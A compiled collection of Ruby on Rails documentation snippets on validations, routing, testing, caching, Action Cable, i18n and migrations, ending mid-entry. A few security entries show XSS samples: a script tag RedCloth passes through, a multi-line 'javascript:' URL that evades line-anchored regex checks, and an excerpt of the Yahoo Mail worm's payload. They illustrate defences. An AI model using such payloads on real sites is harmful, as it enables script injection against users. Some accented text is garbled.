irb> book = Book.new(title: nil)
irb> book.valid?
=> true
irb> book.valid?(:ensure_title)
=> false
irb> book.errors.messages
=> {:title=>["can't be blank"]}

----------------------------------------

TITLE: Accessing Custom Parameter Name in Rails Controllers
DESCRIPTION: Shows how to access a renamed route parameter in controllers. This example demonstrates finding a record using the custom parameter name rather than the default 'id'.

LANGUAGE: ruby
CODE:
Video.find_by(id: params[:identifier])

# Instead of
Video.find_by(id: params[:id])

----------------------------------------

TITLE: Engine Class Decorator Example
DESCRIPTION: Shows how engines can decorate framework classes using initializers, which is a use case for autoload_once_paths since reloading the decoration wouldn't affect the class already decorated.

LANGUAGE: ruby
CODE:
initializer "decorate ActionController::Base" do
  ActiveSupport.on_load(:action_controller_base) do
    include MyDecoration
  end
end

----------------------------------------

TITLE: Eager Loading a Directory for STI Without Collapsing
DESCRIPTION: Configuration to eager load a directory containing Single Table Inheritance models that are meant to be in a namespace, ensuring STI works correctly with autoloading.

LANGUAGE: ruby
CODE:
# config/initializers/preload_stis.rb

unless Rails.application.config.eager_load
  Rails.application.config.to_prepare do
    Rails.autoloaders.main.eager_load_dir("#{Rails.root}/app/models/shapes")
  end
end

----------------------------------------

TITLE: Testing Broadcasts in Rails Models with Action Cable
DESCRIPTION: A test example for verifying that a model correctly broadcasts a message through Action Cable. It uses assert_broadcast_on to check that the expected broadcast occurs when the model's method is called.

LANGUAGE: ruby
CODE:
require "test_helper"

class ProductTest < ActionCable::TestCase
  test "broadcast status after charge" do
    assert_broadcast_on("products:#{product.id}", type: "charged") do
      product.charge(account)
    end
  end
end

----------------------------------------

TITLE: Class Attribute Macros: cattr_reader, cattr_writer, and cattr_accessor in Ruby
DESCRIPTION: Explains how to use cattr_* macros to create class-level attribute accessors that initialize class variables and generate corresponding class and instance methods for accessing them.

LANGUAGE: ruby
CODE:
class MysqlAdapter < AbstractAdapter
  # Generates class methods to access @@emulate_booleans.
  cattr_accessor :emulate_booleans
end

LANGUAGE: ruby
CODE:
class MysqlAdapter < AbstractAdapter
  # Generates class methods to access @@emulate_booleans with default value of true.
  cattr_accessor :emulate_booleans, default: true
end

LANGUAGE: ruby
CODE:
module ActionView
  class Base
    cattr_accessor :field_error_proc, default: Proc.new {
      # ...
    }
  end
end

LANGUAGE: ruby
CODE:
module A
  class B
    # No first_name instance reader is generated.
    cattr_accessor :first_name, instance_reader: false
    # No last_name= instance writer is generated.
    cattr_accessor :last_name, instance_writer: false
    # No surname instance reader or surname= writer is generated.
    cattr_accessor :surname, instance_accessor: false
  end
end

----------------------------------------

TITLE: Skipping Asset Pipeline in Rails Application Generation
DESCRIPTION: Command to create a new Rails application without the asset pipeline using the --skip-asset-pipeline option.

LANGUAGE: bash
CODE:
$ rails new app_name --skip-asset-pipeline

----------------------------------------

TITLE: Using Rails Executor with run!/complete! Pattern
DESCRIPTION: Demonstrates the alternative non-block pattern for using the Rails Executor when wrapping with a block is impractical. This approach is useful in APIs like Rack where block-based wrapping is difficult.

LANGUAGE: ruby
CODE:
Thread.new do
  execution_context = Rails.application.executor.run!
  # your code here
ensure
  execution_context.complete! if execution_context
end

----------------------------------------

TITLE: Hash to_query with Namespace
DESCRIPTION: Demonstrates using Hash#to_query with a namespace parameter to create nested parameter names for complex form submissions.

LANGUAGE: ruby
CODE:
{ id: 89, name: "John Smith" }.to_query("user")
# => "user%5Bid%5D=89&user%5Bname%5D=John+Smith"

----------------------------------------

TITLE: Using stale? with Rack::Cache in Rails Controller
DESCRIPTION: Demonstrates how to use the stale? method in a Rails controller to compare the If-Modified-Since header with a resource's updated_at timestamp, returning a 304 Not Modified response when appropriate.

LANGUAGE: ruby
CODE:
def show
  @post = Post.find(params[:id])

  if stale?(last_modified: @post.updated_at)
    render json: @post
  end
end

----------------------------------------

TITLE: Customizing Connection Pool Settings for Cache Stores
DESCRIPTION: Configuration example for overriding default connection pool settings for cache stores. This allows customizing the size and timeout parameters for the connection pool.

LANGUAGE: ruby
CODE:
config.cache_store = :mem_cache_store, "cache.example.com", { pool: { size: 32, timeout: 1 } }

----------------------------------------

TITLE: Complete Rails Controller Test with Setup and Teardown
DESCRIPTION: A comprehensive controller test for an ArticlesController that includes setup and teardown methods. Setup initializes fixtures before each test, and teardown clears the cache afterward.

LANGUAGE: ruby
CODE:
require "test_helper"

class ArticlesControllerTest < ActionDispatch::IntegrationTest
  # called before every single test
  setup do
    @article = articles(:one)
  end

  # called after every single test
  teardown do
    # when controller is using cache it may be a good idea to reset it afterwards
    Rails.cache.clear
  end

  test "should show article" do
    # Reuse the @article instance variable from setup
    get article_url(@article)
    assert_response :success
  end

  test "should destroy article" do
    assert_difference("Article.count", -1) do
      delete article_url(@article)
    end

    assert_redirected_to articles_path
  end

  test "should update article" do
    patch article_url(@article), params: { article: { title: "updated" } }

    assert_redirected_to article_path(@article)
    # Reload association to fetch updated data and assert that title is updated.
    @article.reload
    assert_equal "updated", @article.title
  end
end

----------------------------------------

TITLE: Layout Inheritance in Rails ApplicationController
DESCRIPTION: Example defining a main layout in the ApplicationController which will be used by all controllers that inherit from it unless overridden.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  layout "main"
end

----------------------------------------

TITLE: Configuring Action Cable Worker Pool Size
DESCRIPTION: Setting the worker pool size for Action Cable to control how many threads process connection callbacks and channel actions simultaneously. This affects performance and database connection requirements.

LANGUAGE: ruby
CODE:
config.action_cable.worker_pool_size = 4

----------------------------------------

TITLE: Updating set_author Method with Configurable Class
DESCRIPTION: Changes the set_author method to use the configurable author_class setting with constantize to convert the string class name to an actual class.

LANGUAGE: ruby
CODE:
self.author = Blorgh.author_class.constantize.find_or_create_by(name: author_name)

----------------------------------------

TITLE: Demonstrating String#parameterize Method in Ruby on Rails
DESCRIPTION: Examples showing how parameterize normalizes strings for use in URLs, replacing spaces with dashes and removing accents.

LANGUAGE: ruby
CODE:
"John Smith".parameterize # => "john-smith"
"Kurt GÃ¶del".parameterize # => "kurt-godel"

----------------------------------------

TITLE: TypeScript to JavaScript Transpilation Example
DESCRIPTION: Demonstrates the concept of transpilation by showing TypeScript code with type annotations being converted to plain JavaScript. This illustrates one aspect of asset preprocessing that was common with Sprockets but is not included by default in Propshaft.

LANGUAGE: typescript
CODE:
const greet = (name: string): void => {
  console.log(`Hello, ${name}!`);
};

LANGUAGE: javascript
CODE:
const greet = (name) => {
  console.log(`Hello, ${name}!`);
};

----------------------------------------

TITLE: Checking Code Format with RuboCop
DESCRIPTION: Command to run RuboCop for checking code formatting consistency across the Rails application.

LANGUAGE: bash
CODE:
$ bin/rubocop

----------------------------------------

TITLE: Viewing All Products After Update in Rails
DESCRIPTION: Checking the Product.all results after updating a record to confirm the changes were saved to the database.

LANGUAGE: irb
CODE:
store(dev)> Product.all

----------------------------------------

TITLE: Overriding Default URL Parameters in Rails
DESCRIPTION: This snippet demonstrates how to override the default URL parameters when generating a URL. The locale parameter is explicitly set to 'fr' instead of using the default.

LANGUAGE: ruby
CODE:
posts_path(locale: :fr) # => "/posts?locale=fr"

----------------------------------------

TITLE: Using XHR in Rails Tests to Pass CSRF Protection
DESCRIPTION: Updated test syntax for JavaScript responses in Rails 4.1, using xhr to explicitly indicate an XMLHttpRequest to bypass CSRF protection, which now covers GET requests with JavaScript responses.

LANGUAGE: ruby
CODE:
xhr :get, :index, format: :js

----------------------------------------

TITLE: Working with PostgreSQL Composite Types in Rails
DESCRIPTION: Shows how to create and use PostgreSQL composite types in Rails applications. The example creates a full_address type, sets up a table using this type, and demonstrates creating and updating records with composite type values.

LANGUAGE: sql
CODE:
CREATE TYPE full_address AS
(
  city VARCHAR(90),
  street VARCHAR(90)
);

LANGUAGE: ruby
CODE:
# db/migrate/20140207133952_create_contacts.rb
execute <<-SQL
  CREATE TYPE full_address AS
  (
    city VARCHAR(90),
    street VARCHAR(90)
  );
SQL
create_table :contacts do |t|
  t.column :address, :full_address
end

LANGUAGE: ruby
CODE:
# app/models/contact.rb
class Contact < ApplicationRecord
end

LANGUAGE: ruby
CODE:
irb> Contact.create address: "(Paris,Champs-ÃlysÃ©es)"
irb> contact = Contact.first
irb> contact.address
=> "(Paris,Champs-ÃlysÃ©es)"
irb> contact.address = "(Paris,Rue Basse)"
irb> contact.save!

----------------------------------------

TITLE: Configuring Log Tags for Action Cable
DESCRIPTION: Ruby configuration for setting up custom log tags in Action Cable. This example adds user account ID, a static tag, and request UUID to help identify specific connections in logs.

LANGUAGE: ruby
CODE:
config.action_cable.log_tags = [
  -> request { request.env["user_account_id"] || "no-account" },
  :action_cable,
  -> request { request.uuid }
]

----------------------------------------

TITLE: Adding Time Travel Helpers in ActiveSupport Testing
DESCRIPTION: Time helper methods for testing that stub Time.now and Date.today to simulate time travel during tests.

LANGUAGE: ruby
CODE:
ActiveSupport::Testing::TimeHelpers#travel

LANGUAGE: ruby
CODE:
ActiveSupport::Testing::TimeHelpers#travel_to

LANGUAGE: ruby
CODE:
ActiveSupport::Testing::TimeHelpers#travel_back

----------------------------------------

TITLE: Routing to Rack Applications in Rails
DESCRIPTION: Demonstrates how to route a path to a Rack application instead of a controller action. This allows integrating any Rack-compatible application within Rails routes.

LANGUAGE: ruby
CODE:
match "/application.js", to: MyRackApp, via: :all

----------------------------------------

TITLE: Installing Engine Migrations to Application
DESCRIPTION: Copies pending engine migrations to the host application so they can be run on the application's database.

LANGUAGE: bash
CODE:
$ bin/rails blorgh:install:migrations

----------------------------------------

TITLE: Implementing Rackup::Server#app Method for Application Loading in Ruby
DESCRIPTION: The app method that loads the Rails application from either a builder string or a configuration file (typically config.ru).

LANGUAGE: ruby
CODE:
module Rackup
  class Server
    def app
      @app ||= options[:builder] ? build_app_from_string : build_app_and_options_from_config
    end

    # ...

    private
      def build_app_and_options_from_config
        if !::File.exist? options[:config]
          abort "configuration #{options[:config]} not found"
        end

        Rack::Builder.parse_file(self.options[:config])
      end

      def build_app_from_string
        Rack::Builder.new_from_string(self.options[:builder])
      end
  end
end

----------------------------------------

TITLE: API Response Format for Attachable SGID
DESCRIPTION: JSON response format for an API endpoint that creates an ActiveStorage::Blob and returns its attachable_sgid.

LANGUAGE: json
CODE:
{
  "attachable_sgid": "BAh7CEkiCGâ¦"
}

----------------------------------------

TITLE: Using exclude? in Ruby on Rails
DESCRIPTION: The exclude? predicate tests whether a given object does not belong to the collection. It is the negation of the built-in include? method. Defined in active_support/core_ext/enumerable.rb.

LANGUAGE: ruby
CODE:
to_visit << node if visited.exclude?(node)

----------------------------------------

TITLE: RedCloth Processing Unfiltered HTML in Ruby
DESCRIPTION: Demonstration of how RedCloth, a Textile markup processor, doesn't filter unsafe HTML tags by default, allowing script injection.

LANGUAGE: ruby
CODE:
RedCloth.new("<script>alert(1)</script>").to_html
# => "<script>alert(1)</script>"

----------------------------------------

TITLE: Querying Records with Product.all in Rails
DESCRIPTION: Shows how to retrieve all Product records from the database after deletion. The query returns only the remaining products, confirming that the previously deleted record is no longer in the database.

LANGUAGE: irb
CODE:
store(dev)> Product.all
  Product Load (1.9ms)  SELECT "products".* FROM "products" /* loading for pp */ LIMIT 11 /*application='Store'*/
=>
[#<Product:0x000000012abde4c8
  id: 2,
  name: "Pants",
  created_at: "2024-11-09 22:33:19.638912000 +0000",
  updated_at: "2024-11-09 22:33:19.638912000 +0000">]

----------------------------------------

TITLE: Example of Explicit Loading in Ruby (Not Rails Way)
DESCRIPTION: An example showing how class loading would typically be done in regular Ruby programs with explicit require statements, which is not the Rails approach.

LANGUAGE: ruby
CODE:
# DO NOT DO THIS.
require "application_controller"
require "post"
# DO NOT DO THIS.

class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

----------------------------------------

TITLE: SQL Generated for Association with Explicit Composite Foreign Keys
DESCRIPTION: Shows the SQL that Rails generates when loading an Author associated with a Book using explicitly defined composite foreign keys.

LANGUAGE: sql
CODE:
SELECT * FROM authors WHERE first_name = 'Jane' AND last_name = 'Doe'

----------------------------------------

TITLE: Basic Integration Test Skeleton in Rails
DESCRIPTION: The initial structure of an integration test that inherits from ActionDispatch::IntegrationTest. This serves as a starting point for creating comprehensive workflow tests.

LANGUAGE: ruby
CODE:
require "test_helper"

class UserFlowsTest < ActionDispatch::IntegrationTest
  # test "the truth" do
  #   assert true
  # end
end

----------------------------------------

TITLE: Creating HTML Email Template for In-Stock Notifications
DESCRIPTION: HTML email template for product back-in-stock notifications with a link to the product.

LANGUAGE: erb
CODE:
<h1>Good news!</h1>

<p><%= link_to @product.name, product_url(@product) %> is back in stock.</p>

----------------------------------------

TITLE: Creating Rails Application with Prototype Instead of jQuery
DESCRIPTION: Command for generating a new Rails 3.1 application using Prototype as the JavaScript library instead of the default jQuery library.

LANGUAGE: bash
CODE:
$ rails new myapp -j prototype

----------------------------------------

TITLE: Accessing Custom Configuration in Rails
DESCRIPTION: Shows how to access custom configuration values that were previously defined using the Rails.configuration object.

LANGUAGE: ruby
CODE:
Rails.configuration.x.payment_processing.schedule # => :daily
Rails.configuration.x.payment_processing.retries  # => 3
Rails.configuration.x.payment_processing.not_set  # => nil
Rails.configuration.super_debugger                # => true

----------------------------------------

TITLE: Excluding Paths from Rails Host Authorization
DESCRIPTION: Shows how to exclude certain request paths from host authorization checks using the exclude configuration option. This is useful for health check endpoints.

LANGUAGE: ruby
CODE:
# Exclude requests for the /healthcheck/ path from host checking
Rails.application.config.host_authorization = {
  exclude: ->(request) { request.path.include?("healthcheck") }
}

----------------------------------------

TITLE: Updating Action Cable WebSocket Adapter Configuration
DESCRIPTION: Diff showing the changes needed when configuring the WebSocket adapter in Action Cable JavaScript API, as the configuration has moved from properties of ActionCable to properties of ActionCable.adapters.

LANGUAGE: diff
CODE:
-    ActionCable.WebSocket = MyWebSocket
+    ActionCable.adapters.WebSocket = MyWebSocket

LANGUAGE: diff
CODE:
-    ActionCable.logger = myLogger
+    ActionCable.adapters.logger = myLogger

----------------------------------------

TITLE: Customizing Solid Cache in cache.yml
DESCRIPTION: Configuration for customizing Solid Cache behavior through cache.yml, including setting max age, max size, and namespace options. These settings control cache retention and organization.

LANGUAGE: yaml
CODE:
default: &default
  store_options:
    # Cap age of oldest cache entry to fulfill retention policies
    max_age: <%= 60.days.to_i %>
    max_size: <%= 256.megabytes %>
    namespace: <%= Rails.env %>

----------------------------------------

TITLE: Controller Test with JSON Request
DESCRIPTION: Shows how to test a create action with JSON content type by setting the as parameter.

LANGUAGE: ruby
CODE:
post articles_url, params: { article: { title: "Ahoy!" } }, as: :json

----------------------------------------

TITLE: Redoing Multiple Migrations with Command Line
DESCRIPTION: Command to redo multiple migrations (roll them back and then run them again) using the db:migrate:redo task with a STEP parameter, useful for applying changes to migrations while maintaining the same schema version.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate:redo STEP=3

----------------------------------------

TITLE: Using delete! to Remove Middlewares with Error Checking
DESCRIPTION: Shows how to use config.middleware.delete! which raises an error if the specified middleware doesn't exist, providing additional safety when modifying the middleware stack.

LANGUAGE: ruby
CODE:
# config/application.rb
config.middleware.delete! ActionDispatch::Executor

----------------------------------------

TITLE: Adding Images with image_tag in Rails
DESCRIPTION: Demonstrates how to use the image_tag helper to insert images into Rails views. Shows various options for specifying paths, dimensions, and HTML attributes.

LANGUAGE: erb
CODE:
<%= image_tag "header.png" %>

LANGUAGE: erb
CODE:
<%= image_tag "icons/delete.gif" %>

LANGUAGE: erb
CODE:
<%= image_tag "icons/delete.gif", {height: 45} %>

LANGUAGE: erb
CODE:
<%= image_tag "home.gif" %>

LANGUAGE: erb
CODE:
<%= image_tag "home.gif", alt: "Home" %>

LANGUAGE: erb
CODE:
<%= image_tag "home.gif", size: "50x20" %>

LANGUAGE: erb
CODE:
<%= image_tag "home.gif", alt: "Go Home",
                          id: "HomeImage",
                          class: "nav_bar" %>

----------------------------------------

TITLE: Adding has_many Association for Comments in Article Model
DESCRIPTION: Defines a has_many relationship between Article and Comment models in the blorgh engine.

LANGUAGE: ruby
CODE:
has_many :comments

----------------------------------------

TITLE: HTML Output for Select Box from City Collection
DESCRIPTION: The HTML output generated when creating a select box from a collection of City objects. Each option's value is the city ID, and the text is the city name.

LANGUAGE: html
CODE:
<select name="person[city_id]" id="person_city_id">
  <option value="1">Berlin</option>
  <option value="3">Chicago</option>
  <option value="2">Madrid</option>
</select>

----------------------------------------

TITLE: Using assign_attributes Method with ActiveModel::AttributeAssignment
DESCRIPTION: This snippet demonstrates using the assign_attributes method provided by ActiveModel::AttributeAssignment to set multiple attributes at once with a hash.

LANGUAGE: ruby
CODE:
irb> person = Person.new

# Set multiple attributes at once
irb> person.assign_attributes(name: "John", date_of_birth: "1998-01-01", active: false)

irb> person.name
=> "John"
irb> person.date_of_birth
=> Thu, 01 Jan 1998
irb> person.active
=> false

----------------------------------------

TITLE: Internationalized Controller and View in Rails
DESCRIPTION: Modified controller and view using Rails' translation helper to abstract away locale-specific strings, enabling easy translation through locale files.

LANGUAGE: ruby
CODE:
# app/controllers/home_controller.rb
class HomeController < ApplicationController
  def index
    flash[:notice] = t(:hello_flash)
  end
end

LANGUAGE: html+erb
CODE:
<!-- app/views/home/index.html.erb -->
<h1><%= t :hello_world %></h1>
<p><%= flash[:notice] %></p>

----------------------------------------

TITLE: Using Named Parameters in Blog Routes
DESCRIPTION: Shows how to use named parameters in routes for a blog application. The ':title' parameter captures the blog post title from the URL, which can then be used to look up the specific post.

LANGUAGE: ruby
CODE:
get "/blog/:title", to: "blog#show"

----------------------------------------

TITLE: Products Table Schema with Foreign Key in Ruby on Rails
DESCRIPTION: This schema shows how the products table looks with a foreign key reference to the users table, including the index on the user_id column.

LANGUAGE: ruby
CODE:
  create_table "products", force: :cascade do |t|
    t.bigint "user_id", null: false
    t.index ["user_id"], name: "index_products_on_user_id"
  end

----------------------------------------

TITLE: Configuring Hosts in Development Environment
DESCRIPTION: Example of how to configure the new config.hosts setting in development environment to allow additional domains or patterns for host authorization checking.

LANGUAGE: ruby
CODE:
# config/environments/development.rb

config.hosts << "dev.myapp.com"
config.hosts << /[a-z0-9-]+\.myapp\.com/ # Optionally, regexp is allowed as well

----------------------------------------

TITLE: Supporting Custom Namespaces in Rails < 7.1
DESCRIPTION: Additional configuration needed for Rails versions prior to 7.1 to properly handle custom namespaces by removing the directory from autoload_paths and adding it to watchable_dirs.

LANGUAGE: ruby
CODE:
# Additional code for applications running on Rails < 7.1.
app_services_dir = "#{Rails.root}/app/services" # has to be a string
ActiveSupport::Dependencies.autoload_paths.delete(app_services_dir)
Rails.application.config.watchable_dirs[app_services_dir] = [:rb]

----------------------------------------

TITLE: Getting Singular Model Name in Rails
DESCRIPTION: Shows how to get the singular version of a class name using model_name.singular. This method returns the singular snake_cased form of the class name.

LANGUAGE: irb
CODE:
irb> Person.model_name.singular
=> "person"

----------------------------------------

TITLE: Setting custom console class for Rails console
DESCRIPTION: This example demonstrates how to configure Rails to use Pry instead of IRB when running the Rails console. The console block is only executed when the console is run, allowing safe requires.

LANGUAGE: ruby
CODE:
console do
  # this block is called only when running console,
  # so we can safely require pry here
  require "pry"
  config.console = Pry
end

----------------------------------------

TITLE: Using I18n Translations in Ruby IRB Console
DESCRIPTION: This example demonstrates how to use the human_attribute_name method from ActiveModel::Translation to get translated attribute names based on the current locale.

LANGUAGE: ruby
CODE:
irb> Person.human_attribute_name("name")
=> "Name"

irb> I18n.locale = :"pt-BR"
=> :"pt-BR"
irb> Person.human_attribute_name("name")
=> "Nome"

----------------------------------------

TITLE: Disabling Forced Encoding for Deterministic Encryption
DESCRIPTION: Disables the forced encoding for deterministic encryption by setting the configuration to nil. This preserves the original encoding of the data but may affect query functionality.

LANGUAGE: ruby
CODE:
config.active_record.encryption.forced_encoding_for_deterministic_encryption = nil

----------------------------------------

TITLE: Equivalent Multiple Resource Definitions
DESCRIPTION: The expanded form of defining multiple resources, showing what the shortcut syntax is equivalent to.

LANGUAGE: ruby
CODE:
resources :photos
resources :books
resources :videos

----------------------------------------

TITLE: Configuring YAML Locales for Boolean String Values in Rails
DESCRIPTION: A YAML configuration file defining English translations for success and failure states. It demonstrates how to properly quote string keys that might otherwise be interpreted as boolean values.

LANGUAGE: yaml
CODE:
# config/locales/en.yml
en:
  success:
    'true':  'True!'
    'on':    'On!'
    'false': 'False!'
  failure:
    true:    'True!'
    off:     'Off!'
    false:   'False!'

----------------------------------------

TITLE: Extracting Substrings from Position in Ruby
DESCRIPTION: Shows the from method which returns substrings starting at a specified position, with support for negative indices.

LANGUAGE: ruby
CODE:
"hello".from(0)  # => "hello"
"hello".from(2)  # => "llo"
"hello".from(-2) # => "lo"
"hello".from(10) # => nil

----------------------------------------

TITLE: Using Integer#multiple_of? in Ruby on Rails
DESCRIPTION: This method tests whether an integer is a multiple of the given argument, returning a boolean. It's useful for testing divisibility.

LANGUAGE: ruby
CODE:
2.multiple_of?(1) # => true
1.multiple_of?(2) # => false

----------------------------------------

TITLE: Custom Error Message for Length Validation in Rails
DESCRIPTION: Shows how to customize error messages for length validation by using the too_long option. This example sets a custom message for when a bio exceeds 1000 characters.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :bio, length: { maximum: 1000,
    too_long: "%{count} characters is the maximum allowed" }
end

----------------------------------------

TITLE: Setting Up a User Model for Action Text Attachments
DESCRIPTION: Sample code for a User model that can be used as an attachment in Action Text, including GlobalID generation examples.

LANGUAGE: ruby
CODE:
# app/models/user.rb
class User < ApplicationRecord
  has_one_attached :avatar
end

user = User.find(1)
user.to_global_id.to_s #=> gid://MyRailsApp/User/1
user.to_signed_global_id.to_s #=> BAh7CEkiCGâ¦

----------------------------------------

TITLE: Manual Shard Switching for Reading Operations
DESCRIPTION: Example of manually switching to a read replica of a specific shard to perform read operations.

LANGUAGE: ruby
CODE:
ShardRecord.connected_to(role: :reading, shard: :shard_one) do
  Person.first # Lookup record from read replica of shard one.
end

----------------------------------------

TITLE: Running Rails Tests on Specific Files with the Test Runner
DESCRIPTION: Examples of using the bin/rails test command to run tests on specific files, methods, lines, or directories. The output shows test execution results with statistics.

LANGUAGE: bash
CODE:
$ bin/rails test test/models/article_test.rb
Running 1 tests in a single process (parallelization threshold is 50)
Run options: --seed 1559

# Running:

..

Finished in 0.027034s, 73.9810 runs/s, 110.9715 assertions/s.

2 runs, 3 assertions, 0 failures, 0 errors, 0 skips

----------------------------------------

TITLE: Slicing Hash Keys with slice! in Rails
DESCRIPTION: The slice! method replaces the hash with only the given keys and returns a hash containing the removed key/value pairs. It modifies the original hash in place.

LANGUAGE: ruby
CODE:
hash = { a: 1, b: 2 }
rest = hash.slice!(:a) # => {:b=>2}
hash                   # => {:a=>1}

----------------------------------------

TITLE: Using blank? in Token Authentication in Ruby on Rails
DESCRIPTION: Example from ActionController showing how to use the blank? method to check whether a token is present for authentication.

LANGUAGE: ruby
CODE:
def authenticate(controller, &login_procedure)
  token, options = token_and_options(controller.request)
  unless token.blank?
    login_procedure.call(token, options)
  end
end

----------------------------------------

TITLE: Exploitable URL Format Using Line-Based Regex
DESCRIPTION: Shows how a malicious URL can bypass validation when using incorrect line-based regex anchors, allowing JavaScript injection by breaking across multiple lines.

LANGUAGE: plaintext
CODE:
javascript:exploit_code();/*
http://hi.com
*/

----------------------------------------

TITLE: Extending Engine Model Using ActiveSupport::Concern in Host Application
DESCRIPTION: Shows how to extend an engine model in the host application by including a concern and adding or overriding methods.

LANGUAGE: ruby
CODE:
# MyApp/app/models/blorgh/article.rb

class Blorgh::Article < ApplicationRecord
  include Blorgh::Concerns::Models::Article

  def time_since_created
    Time.current - created_at
  end

  def summary
    "#{title} - #{truncate(text)}"
  end
end

----------------------------------------

TITLE: Current Behavior of Helper Method in Controllers
DESCRIPTION: Shows the new implementation of the 'helper' method in Rails 6.1, which now uses String#constantize and assumes the helper module is autoloadable.

LANGUAGE: ruby
CODE:
prefix = "foo/bar".camelize
"#{prefix}Helper".constantize

----------------------------------------

TITLE: Marking Explicit Template Dependencies in ERB
DESCRIPTION: Example of using special comment format to indicate explicit template dependencies in ERB templates, particularly useful when rendering happens in helpers where dependencies cannot be automatically derived.

LANGUAGE: html+erb
CODE:
<%= render_sortable_todolists @project.todolists %>

LANGUAGE: html+erb
CODE:
<%# Template Dependency: todolists/todolist %>
<%= render_sortable_todolists @project.todolists %>

----------------------------------------

TITLE: Using assert_redirected_to for Testing Redirects in Rails
DESCRIPTION: Tests that the response is a redirect to a URL matching given options, named routes, or Active Record objects.

LANGUAGE: ruby
CODE:
assert_redirected_to(options = {}, message = nil)

----------------------------------------

TITLE: Using Tag Helpers Outside Form Builders
DESCRIPTION: Shows how to use Rails' tag helpers to create form elements outside the context of a form builder. These helpers have a _tag suffix compared to their form builder counterparts.

LANGUAGE: erb
CODE:
<%= checkbox_tag "accept" %>

----------------------------------------

TITLE: Getting First Characters of a String in Ruby
DESCRIPTION: Shows the first method which returns the first n characters of a string, defaulting to just the first character.

LANGUAGE: ruby
CODE:
"hello".first    # => "h" (implied limit=1)
"hello".first(2) # => "he"
"hello".first(0) # => "" (empty string)

----------------------------------------

TITLE: Setting Up Nested Routes for Articles and Comments
DESCRIPTION: Configures nested resource routes in the engine to support the comment creation functionality.

LANGUAGE: ruby
CODE:
resources :articles do
  resources :comments
end

----------------------------------------

TITLE: Direct Rendering with Instance Variable Initialization in Rails
DESCRIPTION: An alternative implementation that manually sets up the required instance variables before rendering the view, avoiding a redirect while still ensuring all needed data is available.

LANGUAGE: ruby
CODE:
def index
  @books = Book.all
end

def show
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    @books = Book.all
    flash.now[:alert] = "Your book was not found"
    render "index"
  end
end

----------------------------------------

TITLE: Real-World Yahoo Mail XSS Worm Example
DESCRIPTION: An excerpt from the actual Js.Yamanner@m Yahoo Mail worm from 2006, showing how it bypassed Yahoo's HTML filter. This was the first webmail interface worm and worked by exploiting a single-pass filtering vulnerability.

LANGUAGE: html
CODE:
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...

----------------------------------------

TITLE: Setting Application-Wide Layout in Rails
DESCRIPTION: Example showing how to set a default layout for an entire Rails application by defining it in the ApplicationController class.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  layout "main"
  #...
end

----------------------------------------

TITLE: Structured Spanish Locale Configuration with Nested Keys
DESCRIPTION: Shows the Spanish translation file with the same structure as the English version. The nested keys follow the controller/action/key pattern for consistent organization across languages.

LANGUAGE: yaml
CODE:
es:
  hello: "Hola mundo"
  products:
    index:
      title: "Productos"

----------------------------------------

TITLE: Creating Tables for Polymorphic Associations Manually
DESCRIPTION: Shows a migration that manually creates the necessary columns (foreign key and type) to support a polymorphic association.

LANGUAGE: ruby
CODE:
class CreatePictures < ActiveRecord::Migration[8.1]
  def change
    create_table :pictures do |t|
      t.string  :name
      t.bigint  :imageable_id
      t.string  :imageable_type
      t.timestamps
    end

    add_index :pictures, [:imageable_type, :imageable_id]
  end
end

----------------------------------------

TITLE: Processing Rails Commands with rails/commands.rb
DESCRIPTION: Handles command alias resolution and invokes the appropriate Rails command based on the user input.

LANGUAGE: ruby
CODE:
require "rails/command"

aliases = {
  "g"  => "generate",
  "d"  => "destroy",
  "c"  => "console",
  "s"  => "server",
  "db" => "dbconsole",
  "r"  => "runner",
  "t"  => "test"
}

command = ARGV.shift
command = aliases[command] || command

Rails::Command.invoke command, ARGV

----------------------------------------

TITLE: Generating a Blog Flow Integration Test in Rails
DESCRIPTION: This command generates a skeleton for a blog flow integration test using the Rails generator. It creates a test file in the test/integration directory.

LANGUAGE: bash
CODE:
$ bin/rails generate integration_test blog_flow

----------------------------------------

TITLE: Processing Records in Batches with find_in_batches in Ruby on Rails
DESCRIPTION: This code demonstrates the find_in_batches method, which processes large numbers of records from an Active Record model with reduced memory pressure by retrieving records in batches.

LANGUAGE: ruby
CODE:
Customer.find_in_batches(:conditions => {:active => true}) do |customer_group|
  customer_group.each { |customer| customer.update_account_balance! }
end

----------------------------------------

TITLE: Updating Gemfile for Rails 3.1
DESCRIPTION: Required Gemfile configuration for upgrading to Rails 3.1.3, including the new asset pipeline dependencies and jQuery as the default JavaScript library.

LANGUAGE: ruby
CODE:
gem "rails", "= 3.1.3"
gem "mysql2"

# Needed for the new asset pipeline
group :assets do
  gem "sass-rails",   "~> 3.1.5"
  gem "coffee-rails", "~> 3.1.1"
  gem "uglifier",     ">= 1.0.3"
end

# jQuery is the default JavaScript library in Rails 3.1
gem "jquery-rails"

----------------------------------------

TITLE: Creating and Saving a Record in One Step in Rails
DESCRIPTION: Using the create method to instantiate and save a Product record in a single operation. This combines new and save into one convenient method call.

LANGUAGE: irb
CODE:
store(dev)> Product.create(name: "Pants")
  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/
  Product Create (0.4ms)  INSERT INTO "products" ("name", "created_at", "updated_at") VALUES ('Pants', '2024-11-09 16:36:01.856751', '2024-11-09 16:36:01.856751') RETURNING "id" /*application='Store'*/
  TRANSACTION (0.1ms)  COMMIT TRANSACTION /*application='Store'*/
=> #<Product:0x0000000120485c80 id: 2, name: "Pants", created_at: "2024-11-09 16:36:01.856751000 +0000", updated_at: "2024-11-09 16:36:01.856751000 +0000">

----------------------------------------

TITLE: Using Edge Version of Rails with Bash
DESCRIPTION: Command to create a new Rails application using the edge version (directly from the Git repository) using the --edge flag with the rails new command.

LANGUAGE: bash
CODE:
$ rails new myapp --edge

----------------------------------------

TITLE: SQL Query Execution Payload in Active Record
DESCRIPTION: Example of the payload data available during a sql.active_record event. This includes the SQL statement, operation name, binding parameters, transaction info, and query result details.

LANGUAGE: ruby
CODE:
{
